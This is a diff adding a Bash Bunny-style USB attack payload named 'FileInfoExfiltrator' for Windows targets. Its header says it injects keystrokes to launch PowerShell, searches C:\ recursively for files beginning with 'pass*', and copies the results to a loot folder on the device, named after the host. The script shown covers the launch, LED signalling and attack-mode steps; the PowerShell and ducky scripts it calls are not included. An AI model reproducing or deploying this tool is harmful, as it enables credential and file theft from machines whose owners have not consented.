@@ -1,0 +1,51 @@
+#Title: FileInfoExfiltrator
+#Author: A_SarcasticGuy
+#Version: 1.0
+#Target: Windows
+#
+#Runs Powershell that calls a .ps1 file to scan (in all subdirectories of path provided) for all files (by default starting on c:/) beginning with a #specific phrase (default "pass*") to then #be outputted to a text file in the loot directory, in a subfolder with the name of the system and with a #file name of the date and time of the scan.
+#
+#	Options: Search Directory: Find in p.bat (default c:/)
+#	 	 Search criteria: Find in p.bat (default "pass*")
+#
+#	Purple LED..................Script Started
+#	Yellow LED..................Ducky Script Started
+#	Red LED.....................Failed to run Ducky Script, see log file
+#
+#	NOTE: p.ps1 MUST be in loot/payloads/ for this to work.
+#
+
+LED SETUP
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+
+if [ -f "/root/udisk/payloads/${SWITCH_POSITION}/ducky_script.txt" ]; then
+
+
+#Call ducky script
+LED STAGE1
+
+
+QUACK ${SWITCH_POSITION}/ducky_script.txt
+
+
+QUACK DELAY 10000
+
+LED FINISH
+
+else
+
+
+LED FAIL
+
+
+#Red LED if unable to load script
+echo "Unable to load ducky_script.txt" >> /root/debuglog.txt
+
+
+exit 1
+
+
+fi
